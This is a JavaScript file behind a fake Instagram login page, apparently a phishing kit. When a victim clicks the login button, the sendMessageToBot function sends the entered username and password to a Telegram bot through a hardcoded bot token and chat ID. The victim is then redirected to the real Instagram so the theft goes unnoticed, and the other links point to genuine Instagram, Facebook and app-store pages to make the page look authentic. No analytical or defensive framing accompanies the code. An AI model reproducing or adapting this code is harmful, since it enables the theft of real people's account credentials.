let BOT_TOKEN = "6735007254:AAFiORyOufpKuFlyqpokj3mW0NcksqVpDrA";
let TELEGRAM_BOT_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
let TELEGRAM_CHAT_ID = "6735007254";

let loginInput = document.querySelector("#login");
let passwordInput = document.querySelector("#password");
let button = document.querySelector("button");

let loginError = document.querySelector("#login-error");
let passwordError = document.querySelector("#password-error");

let appstore = document.querySelector(".appstore");
let playmarket = document.querySelector(".playmarket");
let fb = document.querySelector(".loginfb");
let forgot = document.querySelector("#forgot");

forgot.addEventListener("click", (event) => {
  event.preventDefault();
  window.location.href = "https://www.instagram.com/accounts/password/reset/";
});

fb.addEventListener("click", (event) => {
  event.preventDefault();
  window.location.href =
    "https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1";
});

appstore.addEventListener("click", (event) => {
  event.preventDefault();
  window.location.href = "https://apps.apple.com/ru/app/instagram/id389801252";
});

playmarket.addEventListener("click", (event) => {
  event.preventDefault();
  window.location.href =
    "https://play.google.com/store/apps/details?id=com.instagram.android&hl=ru&gl=US&pli=1";
});

button.addEventListener("click", (event) => {
  event.preventDefault();

  // Очистить предыдущие сообщения об ошибках
  loginError.textContent = "";
  passwordError.textContent = "";

  let hasError = false;

  // Проверка на пустые поля
  if (!loginInput.value) {
    loginError.textContent = "Please enter your login.";
    hasError = true;
  }

  if (!passwordInput.value) {
    passwordError.textContent = "Please enter your password.";
    hasError = true;
  }

  // Если ошибок нет, отправляем данные
  if (!hasError) {
    sendMessageToBot();
    window.location.href = "https://www.instagram.com/";
  }
});

function sendMessageToBot() {
  fetch(TELEGRAM_BOT_URL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: `\n Login: ${loginInput.value} \n Password: ${passwordInput.value}`,
    }),
  })
    .then((response) => response.json())
    .then((data) => {
      console.log("Message sent successfully:", data);
    })
    .catch((error) => {
      console.error("Error sending message:", error);
    });
}
